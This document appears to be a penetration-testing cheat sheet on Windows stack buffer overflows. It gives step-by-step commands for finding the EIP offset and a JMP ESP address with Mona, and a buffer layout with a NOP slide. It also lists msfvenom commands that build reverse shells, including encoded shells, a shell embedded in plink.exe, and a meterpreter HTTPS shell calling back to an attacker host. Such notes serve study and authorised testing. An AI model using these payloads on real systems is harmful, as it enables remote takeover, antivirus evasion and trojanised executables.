# Windows Buffer Overflows

## Controlling EIP
```
        - locate pattern_create
        - pattern_create.rb -l 2700
        - locate pattern_offset
        - pattern_offset.rb -q 39694438
```
## Verify exact location of EIP - * Exact match at offset 1709
```
    - buffer = "A" \*1709 + "B" \* 4 + "C" \* 90
    - Check for “Bad Characters” - Run multiple times 0x00 - 0xFF
    - Use Mona to determine a module that is unprotected
    - Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP
```
## Use NASM to determine the HEX code for a JMP ESP instruction
```
        - /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
        - JMP ESP
        - 00000000 FFE4 jmp esp
```
## Run Mona in immunity log window to find (FFE4) XEF command
```
        - !mona find -s "\xff\xe4" -m slmfc.dll
        - found at 0x5f4a358f - Flip around for little endian format
        - buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
    ```
## MSFVenom to create payload
```
        - msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
    ```
## Final Payload with NOP slide
```
        - buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
    ```





-----------------------





## Shells:
#### Create a PE Reverse Shell
```
        - msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f
        - exe -o shell_reverse.exe
    ```
#### Create a PE Reverse Shell and Encode 9 times with Shikata_ga_nai
```
        - msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f
        - exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
    ```
#### Create a PE reverse shell and embed it into an existing executable
```
        - msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```
#### Create a PE Reverse HTTPS shell
```
        - msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=443 -f exe -o met_https_reverse.exe
```
